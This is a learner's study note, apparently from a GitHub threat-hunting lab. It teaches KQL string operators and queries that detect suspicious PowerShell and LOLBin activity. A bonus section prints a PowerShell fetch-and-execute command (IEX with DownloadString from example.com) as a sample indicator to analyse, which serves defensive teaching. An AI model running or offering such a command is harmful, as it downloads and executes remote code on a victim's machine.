# Day 03 — KQL String Hunting

## 🎯 Objective

Learn how to search inside KQL string fields and use string operators for basic threat hunting.

Today I learned:

* `contains`
* `has`
* `startswith`
* `endswith`
* `in~`
* Combining multiple string conditions
* Hunting suspicious PowerShell activity

---

## 1. `contains`

`contains` checks whether a string contains another string.

```kql
DeviceProcessEvents
| where ProcessCommandLine contains "EncodedCommand"
```

This searches the `ProcessCommandLine` field for the specified text.

---

## 2. `has`

`has` searches for a complete term/token.

```kql
DeviceProcessEvents
| where ProcessCommandLine has "powershell"
```

### Key difference

```text
contains → substring search
has      → term/token search
```

---

## 3. `startswith`

Checks whether a value starts with a particular string.

```kql
DeviceProcessEvents
| where FileName startswith "power"
```

This can match values beginning with `power`.

---

## 4. `endswith`

Checks whether a value ends with a particular string.

```kql
DeviceProcessEvents
| where FileName endswith ".exe"
```

This can be useful when searching for files with a specific extension.

---

## 5. `in~`

`in~` checks whether a value matches one of several values without considering letter case.

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "cmd.exe", "wscript.exe")
```

This is useful when hunting for multiple processes.

---

# 🧪 Task 1 — Encoded PowerShell

### Objective

Find PowerShell executions containing `EncodedCommand`.

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe")
| where ProcessCommandLine contains "EncodedCommand"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Security relevance

Encoded PowerShell commands can be used to hide command content and may warrant further investigation.

---

# 🧪 Task 2 — Execution Policy Bypass

### Objective

Find PowerShell executions containing `ExecutionPolicy Bypass`.

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe")
| where ProcessCommandLine contains "ExecutionPolicy Bypass"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Security relevance

Attackers may attempt to bypass PowerShell execution restrictions. This should be investigated together with the user, parent process, command line, and subsequent activity.

---

# 🧪 Task 3 — Multiple PowerShell Indicators

### Objective

Find PowerShell executions containing either:

* `ExecutionPolicy Bypass`
* `EncodedCommand`

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe")
| where ProcessCommandLine contains "ExecutionPolicy Bypass"
    or ProcessCommandLine contains "EncodedCommand"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Investigation logic

```text
PowerShell
    ↓
Command Line
    ↓
 ┌───────────────────────┐
 │ EncodedCommand        │
 │ OR                    │
 │ ExecutionPolicy Bypass│
 └───────────────────────┘
    ↓
Potentially suspicious activity
```

---

# 🧪 Task 4 — LOLBin Hunting

### Objective

Search for several Windows scripting/interpreter processes.

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

This creates a basic process-hunting query for commonly abused Windows tools.

---

# 🔥 Bonus — Suspicious PowerShell Indicators

Example command line:

```text
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')"
```

Three suspicious indicators identified:

### 1. `ExecutionPolicy Bypass`

May indicate an attempt to bypass PowerShell execution restrictions.

### 2. `IEX`

`IEX` (`Invoke-Expression`) can execute PowerShell code supplied as a string and therefore deserves investigation when combined with other suspicious behavior.

### 3. `DownloadString`

`DownloadString` can retrieve content from a remote location, which may indicate script downloading or remote code retrieval.

### Important

None of these indicators alone proves malicious activity. A SOC analyst should investigate the surrounding context before declaring the activity malicious.

---

# 📚 KQL Operators Learned

| Operator     | Purpose                                             |
| ------------ | --------------------------------------------------- |
| `contains`   | Searches for a substring                            |
| `has`        | Searches for a term/token                           |
| `startswith` | Checks the beginning of a string                    |
| `endswith`   | Checks the end of a string                          |
| `in~`        | Matches against multiple values, case-insensitively |
| `or`         | Combines multiple conditions                        |

---

# 🎯 Day 03 Key Takeaways

1. String operators allow analysts to search inside telemetry.
2. `contains` is useful for finding specific command-line strings.
3. `has` searches for terms/tokens.
4. `in~` makes multi-process hunting easier.
5. Command-line analysis provides more context than simply looking at the process name.
6. Suspicious PowerShell indicators should be investigated in context.
7. Multiple weak indicators can become more interesting when they appear together.

---

## 📁 GitHub

```text
KQL-Threat-Hunting-Lab/
└── 01-KQL-Basics/
    ├── day01_kql_basics.md
    ├── day02_where_filtering.md
    └── day03_string_hunting.md
```

### Git commit

```text
Day 03: KQL string hunting and PowerShell analysis
```

### Day 03 Status

**✅ Passed — 9.5/10**

**Correction made:** `Contain` → `contains` in Tasks 2 and 3. Also, `in~ ("powershell.exe")` works, but for a single value `FileName =~ "powershell.exe"` is simpler; we'll learn that distinction later.
